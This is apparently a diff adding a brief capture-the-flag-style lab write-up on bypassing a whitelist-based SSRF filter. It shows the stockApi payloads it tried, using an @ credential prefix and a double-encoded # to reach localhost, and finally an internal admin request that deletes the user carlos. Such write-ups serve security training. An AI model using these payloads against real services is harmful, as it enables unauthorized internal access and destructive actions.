@@ -1,0 +1,23 @@
+SSRF with whitelist-based input filter
+
+Start by checking the effects of adding @ to the querry:
+
+stockApi=http://username@stock.weliketoshop.net/
+
+A 500 error. Adding a # (as in /username#@stock.weliketoshop.net) gets us the same result.
+Let's use our trusty double encoding for #:
+
+stockApi=http://username%2523@stock.weliketoshop.net/
+
+We get a different error:
+"Could not connect to external stock check service"
+
+Okay, so it attempts to connect to the username. Let's replace the username with localhost:
+
+stockApi=http://localhost:80%2523@stock.weliketoshop.net
+
+Cool, we got a 200. Now let's delete carlos:
+
+stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
+
+Wonderful.
